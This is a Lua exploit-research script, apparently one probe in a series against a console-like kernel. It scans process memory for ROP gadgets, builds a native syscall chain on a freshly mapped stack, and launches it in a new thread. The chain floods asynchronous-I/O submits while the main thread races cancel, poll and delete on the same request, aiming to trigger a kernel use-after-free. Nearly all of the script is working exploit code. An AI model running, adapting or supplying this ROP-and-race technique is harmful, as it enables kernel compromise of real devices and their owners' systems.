-- CRASH_CLASS: HIGH
-- PROBE 411a: submit racing cancel and delete, from a native chain
--
-- 409a gave native syscall sequences with per-link arguments; 352a-352p measured the AIO
-- family and found request objects that outlive their call (ids are generation-tagged,
-- 664 mutates a byte inside the request, 666 cancels, 662 deletes). A worker completing a
-- request whose completion path has been torn down is the classic AIO lifetime bug.
--
-- One child submits 669(cmd=1, count=1) on /dev/zero two hundred times, overwriting the
-- same id slot, while the main thread reads that slot and cancels, polls and deletes it.
-- A clean run means the lifetime is held; a fault or a console event means it is not.
-- One child only (405a: five parked children starve the loader and cannot be released).

print("=== PROBE 411a: AIO RACE ===")

local SUBMITS = 200

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end
local function rdq(a)
    local q = memory.read_qword(a)
    if type(q) == "table" then return to_num(q.l) end
    return to_num(q)
end

-- [A] target file and buffers
local path = memory.alloc(0x40)
do
    local s = "/dev/zero"
    local i = 1
    while i <= #s do memory.write_byte(path + i - 1, s:byte(i)); i = i + 1 end
    memory.write_byte(path + #s, 0)
end
local fd = call(5, sgn(path), 0, 0)
print(string.format("[A] open /dev/zero fd=%d", fd))
if fd <= 0 then print("=== 411a DONE ===") return end

local req = memory.alloc(0x40)      -- one descriptor, stride 0x28
local data = memory.alloc(0x1000)
local result = memory.alloc(0x40)
local ids = memory.alloc(0x20)
local states = memory.alloc(0x40)
local cout = memory.alloc(0x40)
memory.write_qword(ids, u64(0, 0))
memory.write_qword(result, u64(0, 0))
memory.write_byte(req + 0x00, 0)
memory.write_qword(req + 0x08, u64(0, 0x1000))
memory.write_qword(req + 0x10, u64v(sgn(data)))
memory.write_qword(req + 0x18, u64v(sgn(result)))
memory.write_dword(req + 0x20, fd)

-- control: one synchronous submit, so the shape is known good before the race
local sub = call(669, 1, sgn(req), 1, 1, sgn(ids))
local first_id = rdq(ids)
print(string.format("[A] control submit rv=%d id=0x%X", sub, first_id))
local pol = call(664, sgn(ids), 1, sgn(states))
print(string.format("[A] control poll rv=%d state=0x%X", pol, rdq(states)))
local del = call(662, sgn(ids), 1, sgn(cout))
print(string.format("[A] control delete rv=%d out=0x%X", del, rdq(cout)))
memory.write_qword(ids, u64(0, 0))

-- [B] gadgets
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
call(593, 0, sgn(info), 0, 0, 0, 0)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
if size > 0x600000 then size = 0x600000 end
local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("=== 411a DONE ===") return end
    buf = b
end
local park, pop_rax = 0, 0
do
    local i = 1
    while i < #buf - 1 do
        local x, y = buf:byte(i, i + 1)
        if x == 0xEB and y == 0xFE and park == 0 then park = base + i - 1 end
        if x == 0x58 and y == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 then break end
        i = i + 1
    end
end
local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[B] base=0x%X park=0x%X pop=0x%X gadget=0x%X", base, park, pop_rax, gadget))
if park <= 0 or pop_rax <= 0 or gadget <= 0 then print("=== 411a DONE ===") return end

local stack = call(477, 0, 0x8000, 3, 0x1002, 0xFFFFFFFF, 0)
print(string.format("[B] stack=0x%X", stack))
if stack <= 0 then print("=== 411a DONE ===") return end

-- [C] chain: SUBMITS x 669(cmd=1, reqs, 1, class=1, ids), then park
local rsp = stack + 0x2000
local p = rsp
local function wq(v) memory.write_qword(p, u64v(v)); p = p + 8 end
wq(669)
local i = 0
while i < SUBMITS do
    wq(gadget)
    if i < SUBMITS - 1 then
        wq(pop_rax)
        wq(669)
    end
    i = i + 1
end
wq(park)

local ctx = memory.alloc(0x500)
do
    local k = 0
    while k < 0x500 do memory.write_dword(ctx + k, 0); k = k + 4 end
end
memory.write_qword(ctx + 0x108, u64(0, 0x480))
memory.write_qword(ctx + 0x110, u64(0, 0x10000))
memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
memory.write_qword(ctx + 0x0e0, u64v(pop_rax))
memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
memory.write_qword(ctx + 0x0f8, u64v(rsp))
memory.write_qword(ctx + 0x100, u64(0, 0x3b))
memory.write_qword(ctx + 0x048, u64(0, 1))                 -- rdi cmd = 1 (read)
memory.write_qword(ctx + 0x050, u64v(sgn(req)))           -- rsi descriptors
memory.write_qword(ctx + 0x058, u64(0, 1))                -- rdx count = 1
memory.write_qword(ctx + 0x060, u64(0, 1))                -- rcx class = 1
memory.write_qword(ctx + 0x068, u64v(sgn(ids)))           -- r8  id slot
print(string.format("[C] chain armed: %d submits, ends 0x%X", SUBMITS, p))

local out = memory.alloc(0x20)
memory.write_qword(out, u64(0, 0))
local trv = call(430, sgn(ctx), sgn(out), 0)
print(string.format("[C] child created rv=%d tid=0x%X", trv, rdq(out)))

-- [D] main thread tears down whatever id appears
local cancels, polls, deletes = 0, 0, 0
local seen, last_id = 0, 0
local round = 0
while round < 4000 do
    local id = rdq(ids)
    if id ~= last_id then
        seen = seen + 1
        last_id = id
        if call(666, sgn(ids), 1, sgn(cout)) == 0 then cancels = cancels + 1 end
        if call(664, sgn(ids), 1, sgn(states)) == 0 then polls = polls + 1 end
        if call(662, sgn(ids), 1, sgn(cout)) == 0 then deletes = deletes + 1 end
    end
    round = round + 1
end
print(string.format("[D] seen=%d cancels=%d polls=%d deletes=%d", seen, cancels, polls, deletes))

-- [E] after: is the process still sane and does the queue still answer?
local q2 = call(669, 1, sgn(req), 1, 1, sgn(ids))
local id2 = rdq(ids)
local p2 = call(664, sgn(ids), 1, sgn(states))
print(string.format("[E] submit after race rv=%d id=0x%X poll rv=%d state=0x%X",
    q2, id2, p2, rdq(states)))
print(string.format("[E] thr_self rv=%d", call(432, sgn(out), 0)))
print("=== 411a DONE ===")
